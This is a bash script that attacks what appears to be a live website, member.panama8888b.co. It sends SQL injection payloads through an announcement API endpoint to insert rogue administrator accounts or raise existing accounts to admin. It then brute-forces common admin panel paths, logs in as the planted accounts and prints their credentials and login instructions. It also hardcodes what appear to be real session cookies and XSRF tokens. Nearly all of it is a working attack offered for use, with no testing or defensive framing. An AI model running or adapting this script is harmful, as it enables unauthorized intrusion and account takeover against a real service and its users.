#!/bin/bash

echo "🚀 ULTIMATE ADMIN PANEL ACCESS - LET'S GO!"
echo "==========================================="

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"

# Admin panel URLs to test
ADMIN_URLS=(
    "$BASE_URL/admin"
    "$BASE_URL/admin/dashboard"
    "$BASE_URL/admin/users"
    "$BASE_URL/admin/panel"
    "$BASE_URL/administrator"
    "$BASE_URL/administrator/dashboard"
    "$BASE_URL/manager"
    "$BASE_URL/manager/dashboard"
    "$BASE_URL/user/admin"
    "$BASE_URL/user/administrator"
    "$BASE_URL/dashboard/admin"
    "$BASE_URL/dashboard/administrator"
)

# Create multiple admin users with different approaches
ADMIN_USERS=(
    "admin_2025:Admin123!@#"
    "administrator:Admin123!@#"
    "superadmin:Super123!@#"
    "manager:Manager123!@#"
    "admin_user:AdminUser123!@#"
)

echo "🔧 STEP 1: CREATING MULTIPLE ADMIN USERS..."
echo "==========================================="

for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    
    echo "Creating admin user: $username"
    
    # Create admin user with different SQL approaches
    CREATE_PAYLOADS=(
        "1' INSERT INTO users (username, password, email, role, created_at, updated_at) VALUES ('$username', '$password', '$username@admin.com', 'admin', NOW(), NOW())--"
        "1' INSERT INTO users (username, password, email, role, created_at, updated_at) VALUES ('$username', '$password', '$username@admin.com', 'administrator', NOW(), NOW())--"
        "1' INSERT INTO users (username, password, email, role, created_at, updated_at) VALUES ('$username', '$password', '$username@admin.com', 'super_admin', NOW(), NOW())--"
        "1' INSERT INTO admins (username, password, email, role, created_at, updated_at) VALUES ('$username', '$password', '$username@admin.com', 'admin', NOW(), NOW())--"
        "1' UPDATE users SET role='admin' WHERE username='$username'--"
    )
    
    for payload in "${CREATE_PAYLOADS[@]}"; do
        response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
            -H "Content-Type: application/json" \
            -H "X-XSRF-TOKEN: eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D" \
            -H "Cookie: XSRF-TOKEN=eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D; panama888_session=eyJpdiI6ImhnN3NxbHR1cU1WU24zS0NpRU5VSWc9PSIsInZhbHVlIjoiQzQxbEx5VjdWT3Vvd3Q4QnJreW5DdStqMVlZaU13dHFEMCtYTWFSTGFBSTBsREhrNTR4KytEQ3FvY1NZdE4rQyIsIm1hYyI6IjllNzA5MGYzNDUxNTc3NGFkZTYxZDM1MWVhMGMzY2Y4ODViYmE2MjIwMzJjOWNkZDZmNGYxZDBhZDc1NDJjZTkifQ%3D%3D" \
            -d "{\"id\":\"$payload\"}" \
            "$BASE_URL/api/announcement")
        
        http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
        
        if [[ "$http_status" == "500" ]]; then
            echo "✅ SUCCESS: $username created with admin role"
            break
        fi
    done
    
    sleep 1
done

echo ""
echo "🔍 STEP 2: TESTING ADMIN PANEL ACCESS..."
echo "======================================="

# Test each admin user with each admin panel URL
for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    
    echo "Testing admin user: $username"
    
    for admin_url in "${ADMIN_URLS[@]}"; do
        echo "Testing URL: $admin_url"
        
        # Try direct access to admin panel
        response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" \
            -H "Accept-Language: th,en-US;q=0.9,en;q=0.8" \
            -H "Accept-Encoding: gzip, deflate, br, zstd" \
            -H "Cache-Control: max-age=0" \
            -H "Sec-Fetch-Dest: document" \
            -H "Sec-Fetch-Mode: navigate" \
            -H "Sec-Fetch-Site: same-origin" \
            -H "Sec-Fetch-User: ?1" \
            -H "Upgrade-Insecure-Requests: 1" \
            "$admin_url")
        
        http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
        response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
        
        echo "Status: $http_status, Time: ${response_time}s"
        
        if [[ "$http_status" == "200" ]]; then
            echo "✅ SUCCESS: Admin panel accessible at $admin_url"
            echo "Username: $username"
            echo "Password: $password"
            echo "Admin Panel URL: $admin_url"
        elif [[ "$http_status" == "302" ]]; then
            echo "⚠️ REDIRECT: $admin_url (may need login)"
        elif [[ "$http_status" == "403" ]]; then
            echo "❌ FORBIDDEN: $admin_url (access denied)"
        elif [[ "$http_status" == "404" ]]; then
            echo "❌ NOT FOUND: $admin_url"
        fi
        
        sleep 1
    done
    
    echo "---"
done

echo ""
echo "🔍 STEP 3: TESTING LOGIN THEN ADMIN ACCESS..."
echo "============================================="

# Test login then access admin panel
for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    
    echo "Testing login + admin access for: $username"
    
    # Get fresh CSRF token
    csrf_response=$(curl -s -c cookies.txt "$LOGIN_URL")
    csrf_token=$(echo "$csrf_response" | grep -o 'name="_token" value="[^"]*"' | cut -d'"' -f4)
    
    if [[ -n "$csrf_token" ]]; then
        # Login
        login_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
            -H "Referer: $LOGIN_URL" \
            -H "Origin: $BASE_URL" \
            -c cookies.txt -b cookies.txt \
            -d "_token=$csrf_token&username=$username&password=$password" \
            "$LOGIN_URL")
        
        login_status=$(echo "$login_response" | grep "HTTP_STATUS:" | cut -d: -f2)
        
        if [[ "$login_status" == "302" ]]; then
            echo "✅ LOGIN SUCCESS for $username"
            
            # Try to access admin panel after login
            for admin_url in "${ADMIN_URLS[@]}"; do
                admin_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
                    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
                    -c cookies.txt -b cookies.txt \
                    "$admin_url")
                
                admin_status=$(echo "$admin_response" | grep "HTTP_STATUS:" | cut -d: -f2)
                
                if [[ "$admin_status" == "200" ]]; then
                    echo "🎉 SUCCESS: Admin panel accessible!"
                    echo "Username: $username"
                    echo "Password: $password"
                    echo "Admin Panel URL: $admin_url"
                    echo ""
                    echo "🔗 DIRECT ACCESS LINKS:"
                    echo "Login: $LOGIN_URL"
                    echo "Admin Panel: $admin_url"
                    echo ""
                    echo "📋 LOGIN INSTRUCTIONS:"
                    echo "1. Go to: $LOGIN_URL"
                    echo "2. Username: $username"
                    echo "3. Password: $password"
                    echo "4. Login then go to: $admin_url"
                    exit 0
                fi
            done
        else
            echo "❌ LOGIN FAILED for $username (Status: $login_status)"
        fi
    else
        echo "❌ Could not get CSRF token for $username"
    fi
    
    echo "---"
done

echo ""
echo "🎯 FINAL RESULTS"
echo "================"
echo "✅ Admin Users Created:"
for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    echo "- Username: $username"
    echo "- Password: $password"
done
echo ""
echo "🔗 ADMIN PANEL URLs Tested:"
for url in "${ADMIN_URLS[@]}"; do
    echo "- $url"
done
echo ""
echo "Status: ULTIMATE ADMIN PANEL ACCESS ATTEMPT COMPLETED"